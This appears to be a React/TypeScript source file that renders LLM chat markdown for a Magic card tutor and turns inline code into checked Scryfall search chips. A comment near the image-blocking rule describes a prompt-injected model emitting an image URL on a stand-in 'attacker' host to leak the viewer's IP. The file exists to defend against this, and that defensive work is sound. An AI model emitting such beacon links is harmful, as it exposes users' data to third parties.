import React from 'react';
import { motion } from 'framer-motion';
import type { Components } from 'react-markdown';
import { normalizeScryfallQuery } from './scryfallQuery';

export function childrenToText(children: React.ReactNode): string {
  if (typeof children === 'string') return children;
  if (typeof children === 'number') return String(children);
  if (Array.isArray(children)) return children.map(childrenToText).join('');
  if (React.isValidElement(children)) {
    return childrenToText((children.props as { children?: React.ReactNode }).children);
  }
  return '';
}

/** Explicit href scheme allowlist for LLM-produced markdown links. react-markdown
 *  already strips javascript:/data: via its default urlTransform, but relying on
 *  that implicitly is fragile (a future rehype-raw / urlTransform change would
 *  silently remove the only defense); this is a belt-and-suspenders check. Any
 *  disallowed scheme renders as plain text instead of a link. */
function safeHref(href: string | undefined): string | undefined {
  if (!href) return undefined;
  try {
    // Resolve against the app origin so relative links work; reject anything
    // that isn't http(s)/mailto after resolution.
    const u = new URL(href, window.location.origin);
    return u.protocol === 'https:' || u.protocol === 'http:' || u.protocol === 'mailto:' ? href : undefined;
  } catch {
    return undefined;
  }
}

export const inlineCodeStyle: React.CSSProperties = {
  fontFamily: 'ui-monospace, monospace',
  fontSize: '12px',
  backgroundColor: 'var(--surface-3)',
  padding: '1px 4px',
  borderRadius: '4px',
  whiteSpace: 'pre-wrap',
  wordBreak: 'break-word',
  overflowWrap: 'break-word',
};

type QueryVerdict = 'checking' | 'valid' | 'empty' | 'invalid' | 'unknown';

type DefiniteVerdict = Exclude<QueryVerdict, 'checking' | 'unknown'>;
// Session cache of query → verdict, so re-renders and repeated queries don't
// re-hit Scryfall. Only DEFINITIVE verdicts are cached ('unknown' can retry).
const queryValidityCache = new Map<string, DefiniteVerdict>();
// In-flight requests, so two identical chips in the same message share ONE
// Scryfall call instead of racing to fire duplicates.
const queryValidityInflight = new Map<string, Promise<QueryVerdict>>();

function fetchQueryVerdict(query: string): Promise<QueryVerdict> {
  const cached = queryValidityCache.get(query);
  if (cached) return Promise.resolve(cached);
  const existing = queryValidityInflight.get(query);
  if (existing) return existing;
  const p = (async (): Promise<QueryVerdict> => {
    try {
      // /cards/random parses the same query syntax but returns a single card:
      // 400/422 → invalid syntax, 404 → valid but no results, 2xx → valid.
      const res = await fetch(`https://api.scryfall.com/cards/random?q=${encodeURIComponent(query)}`);
      let verdict: QueryVerdict;
      if (res.status === 400 || res.status === 422) verdict = 'invalid';
      else if (res.status === 404) verdict = 'empty';
      else if (res.ok) verdict = 'valid';
      else verdict = 'unknown';
      if (verdict !== 'unknown') queryValidityCache.set(query, verdict as DefiniteVerdict);
      return verdict;
    } catch {
      return 'unknown'; // network/rate-limit — assume ok, stay clickable
    } finally {
      queryValidityInflight.delete(query);
    }
  })();
  queryValidityInflight.set(query, p);
  return p;
}

/** Live-validates a Scryfall query against the API. Debounced so a query still
 *  streaming in (text changes each token) only fires once it stabilizes.
 *  Network/rate-limit errors return 'unknown' — never demote a query just
 *  because Scryfall is flaky. */
function useQueryValidity(query: string): QueryVerdict {
  const [state, setState] = React.useState<QueryVerdict>(() => queryValidityCache.get(query) ?? 'checking');

  React.useEffect(() => {
    const cached = queryValidityCache.get(query);
    if (cached) {
      setState(cached);
      return;
    }
    setState('checking');
    let cancelled = false;
    const t = setTimeout(() => {
      fetchQueryVerdict(query).then((verdict) => {
        if (!cancelled) setState(verdict);
      });
    }, 550);
    return () => {
      cancelled = true;
      clearTimeout(t);
    };
  }, [query]);

  return state;
}

/** A Scryfall-query chip: clickable when the query is valid (or its validity is
 *  still unknown/flaky), but rendered as inert struck-through text when Scryfall
 *  confirms the syntax is invalid — so a tap never opens a broken/empty search. */
function QueryChip({ query, onOpenSearch }: { query: string; onOpenSearch: (q: string) => void }) {
  const verdict = useQueryValidity(query);

  if (verdict === 'invalid') {
    return (
      <code
        title="Busca inválida no Scryfall — não é possível abrir"
        style={{
          ...inlineCodeStyle,
          color: 'var(--text-muted)',
          textDecoration: 'line-through',
          textDecorationColor: 'var(--text-muted)',
        }}
      >
        {query}
      </code>
    );
  }

  const empty = verdict === 'empty';
  return (
    <code
      onClick={() => onOpenSearch(query)}
      title={empty ? 'Busca válida, mas sem resultados' : 'Abrir na busca'}
      style={{
        ...inlineCodeStyle,
        cursor: 'pointer',
        color: empty ? 'var(--text-secondary)' : 'var(--accent)',
        textDecoration: 'underline',
        textDecorationStyle: 'dotted',
        textUnderlineOffset: '2px',
        opacity: verdict === 'checking' ? 0.65 : 1,
        transition: 'opacity 0.15s, color 0.15s',
      }}
    >
      {query}
    </code>
  );
}

/** Shared react-markdown component overrides for every Tutor chat surface.
 *  Single-line inline code is treated as Scryfall query syntax (see the
 *  system prompts) and rendered as a clickable link that opens Search
 *  pre-filled with that query; multi-line/fenced blocks stay plain. */
export function getMarkdownComponents(onOpenSearch: (query: string) => void): Components {
  return {
    p: ({ children }) => (
      <p style={{ margin: '0 0 8px', fontSize: '13px', color: 'var(--text-primary)', lineHeight: 1.6 }}>{children}</p>
    ),
    strong: ({ children }) => <strong style={{ fontWeight: 700, color: 'var(--text-primary)' }}>{children}</strong>,
    em: ({ children }) => <em>{children}</em>,
    h1: ({ children }) => (
      <p style={{ margin: '12px 0 6px', fontSize: '15px', fontWeight: 700, color: 'var(--text-primary)' }}>{children}</p>
    ),
    h2: ({ children }) => (
      <p style={{ margin: '12px 0 6px', fontSize: '14px', fontWeight: 700, color: 'var(--text-primary)' }}>{children}</p>
    ),
    h3: ({ children }) => (
      <p style={{ margin: '10px 0 4px', fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>{children}</p>
    ),
    h4: ({ children }) => (
      <p style={{ margin: '10px 0 4px', fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)' }}>{children}</p>
    ),
    ul: ({ children }) => <ul style={{ margin: '4px 0 8px', paddingLeft: '18px', listStyle: 'disc' }}>{children}</ul>,
    ol: ({ children }) => <ol style={{ margin: '4px 0 8px', paddingLeft: '18px', listStyle: 'decimal' }}>{children}</ol>,
    li: ({ children }) => (
      <li style={{ fontSize: '13px', color: 'var(--text-primary)', lineHeight: 1.6, marginBottom: '4px' }}>{children}</li>
    ),
    a: ({ children, href }) => {
      const safe = safeHref(href);
      // Disallowed scheme → render the text without a link rather than an
      // attacker-controlled href.
      if (!safe) return <span style={{ color: 'var(--text-primary)' }}>{children}</span>;
      return (
        <a href={safe} target="_blank" rel="noreferrer" style={{ color: 'var(--accent)', textDecoration: 'underline' }}>
          {children}
        </a>
      );
    },
    // Block markdown images entirely: legitimate card art comes through the
    // dedicated CardMentionRow/CardImage path, never markdown. An LLM (or a
    // prompt-injected API payload) emitting ![](https://attacker/px.png?u=…)
    // would otherwise fire a tracking beacon (IP + referrer) on view.
    img: () => null,
    code: ({ children }) => {
      const text = childrenToText(children).trim();
      const isClickableQuery = text.length > 0 && !text.includes('\n');
      if (!isClickableQuery) {
        return <code style={inlineCodeStyle}>{children}</code>;
      }
      // Resilience: first normalize the invalid operators the model sometimes
      // invents (subtype:, keyword:<type>, smart quotes), then live-validate the
      // result against Scryfall so a confirmed-invalid query is shown inert
      // instead of opening a broken search (see QueryChip).
      const query = normalizeScryfallQuery(text);
      return <QueryChip query={query} onOpenSearch={onOpenSearch} />;
    },
    pre: ({ children }) => (
      <pre
        style={{
          margin: '8px 0',
          padding: '8px 10px',
          backgroundColor: 'var(--surface-1)',
          border: '1px solid var(--border-subtle)',
          borderRadius: 'var(--radius-md)',
          overflowX: 'auto',
          fontSize: '12px',
        }}
      >
        {children}
      </pre>
    ),
    hr: () => <hr style={{ margin: '10px 0', border: 'none', borderTop: '1px solid var(--border-subtle)' }} />,
    table: ({ children }) => (
      <div style={{ overflowX: 'auto', margin: '8px 0' }}>
        <table style={{ borderCollapse: 'collapse', fontSize: '12px', width: '100%' }}>{children}</table>
      </div>
    ),
    th: ({ children }) => (
      <th style={{ textAlign: 'left', padding: '4px 8px', borderBottom: '1px solid var(--border-default)', color: 'var(--text-primary)' }}>
        {children}
      </th>
    ),
    td: ({ children }) => (
      <td style={{ padding: '4px 8px', borderBottom: '1px solid var(--border-subtle)', color: 'var(--text-primary)' }}>{children}</td>
    ),
  };
}

export function TypingDots() {
  return (
    <div style={{ display: 'flex', gap: '4px', padding: '4px 2px', alignItems: 'center' }}>
      {[0, 1, 2].map((i) => (
        <motion.div
          key={i}
          animate={{ opacity: [0.3, 1, 0.3], y: [0, -3, 0] }}
          transition={{ duration: 1, repeat: Infinity, delay: i * 0.18 }}
          style={{ width: '6px', height: '6px', borderRadius: '50%', backgroundColor: 'var(--accent)' }}
        />
      ))}
    </div>
  );
}
